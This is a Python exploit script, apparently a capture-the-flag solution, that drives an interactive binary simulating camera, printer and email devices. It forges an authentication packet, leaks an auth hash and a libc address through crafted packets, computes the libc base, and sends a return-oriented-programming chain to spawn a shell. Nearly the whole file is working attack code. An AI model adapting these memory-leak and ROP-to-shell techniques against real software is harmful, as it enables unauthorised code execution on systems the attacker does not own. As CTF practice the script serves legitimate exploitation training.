import interact
import struct

# Pack integer 'n' into a 8-Byte representation
def p64(n):
    return struct.pack('Q', n)
    
# Unpack 8-Byte-long string 's' into a Python integer
def u64(s):
    return struct.unpack('Q', s)[0]

p = interact.Process()

line = "======================================"
line2 = "-----------------------------------------------"

def injectPacket(src, dst, body, length=None):
    p.readuntil(line)
    p.readuntil(line)
    p.sendline(1)
    p.readuntil('Source:')
    p.sendline(src)
    p.readuntil('Destination:')
    p.sendline(dst)
    p.readuntil('Length:')
    p.sendline(str(length if length != None else len(body) + 1))
    p.readuntil('Payload:')
    p.send(body)

# Authenticate Camera
data = p.readuntil('Quit')
p.sendline('2')
payload = 'authCamAdmin\x00'+'\xff'*16
data = p.readuntil('======================================')
data = p.readuntil('======================================')
data = p.readuntil('======================================')
p.sendline('1')
data = p.readuntil('Packet Source:')
p.sendline(1)
data = p.readuntil('Packet Destination:')
p.sendline(0)
data = p.readuntil('Payload Length:')
p.sendline(len(payload)+4)
data = p.readuntil('Packet Payload:')
p.sendline(payload)
data = p.readuntil('Route Packet')
p.sendline('4')
data = p.readuntil('0F')
data = p.readuntil('---\n')
data = p.readuntil('00')

d = p.readuntil('Route Packet')
p.sendline('4')

d = p.readuntil('Route Packet')
p.sendline('3')
p.sendline('authCamAdmin\x00'+ \
    chr(~int(data[:2],16)&255) + \
    chr(~int(data[3:5],16)&255) + \
    chr(~int(data[6:8],16)&255) + \
    chr(~int(data[9:11],16)&255) + \
    '\xff'*12)

data = p.readuntil('Route Packet')
p.sendline('4')

data = p.readuntil('Route Packet')
p.sendline('2')
p.sendline('4')
p.sendline('3')
data = p.readuntil('DISABLED')


#Check 2: Point camera at the pointer
injectPacket(3, 0, 'direction\x03')


#Check 3: Print something
#test print of length 0
for i in range(2):
    document = 'rprint' + p64(0) + '\xff\x00\x00\x00'
    injectPacket(3, 1, document + 0 * 'a')

#cancel print
injectPacket(3, 2, '\x03\xb9\x00\x00' + '\x44\x43\x42\x41')

#attach document 
injectPacket(3, 2, '\x04\xb9\x00\x00' + '\x44\x43\x42\x41' + '\x20\x00\x00\x00' + 'a' * 16)

#Check 4: Leak Hash
#watch camera 
injectPacket(3, 0, 'watch')
print p.readuntil('aaaaaaaaaaaaaaaa')
auth_hash = p.readuntil('\n').strip()

#set on exit
injectPacket(3, 1, 'rctrl' + auth_hash + '\x02\x00\x00\x00' + "exit")

#Check 5: leaking points by sending email

#read email
#Enable Interception
p.readuntil(line)
p.readuntil(line)
p.sendline(2)

injectPacket(3, 1, 'rctrl' + auth_hash + '\x04\x00\x00\x00' + '\x04\x00\x00\x00' + '\x01\x00\x00\x00')
print p.readuntil('Packet\n')
p.sendline(4)
p.readuntil(line2)
p.readuntil(line2)
data = p.readuntil(line2).strip('-')
p.readuntil('Packet\n')    
p.sendline(4)

#disable Interception
p.readuntil(line)
p.readuntil(line)
p.sendline(3)

#finding libc base address
libc_exit_addr = int(''.join(data.strip()[:18].split(' ')[::-1]).strip(), 16)
libc_base_addr = libc_exit_addr - 0x3a030

#leaking the pointers
injectPacket(3, 1, 'rctrl' + auth_hash + '\x03\x00\x00\x00' + '\x04\x00\x00\x00' + p64(libc_base_addr + 0x101f3b))

#Getting shell
rop_chain = [
    libc_base_addr + 0x33544,
    0x3b,
    libc_base_addr + 0xe8c0e,
    libc_base_addr + 0x1b92,
    0x0,
    libc_base_addr + 0x21102,
    libc_base_addr + 0x18cd57,
    libc_base_addr + 0xbc375
]

injectPacket(3, 1, 'rctrl' + auth_hash + '\x05\x00\x00\x00' + 'a' * 8 + ''.join(p64(x) for x in rop_chain))


p.interactive()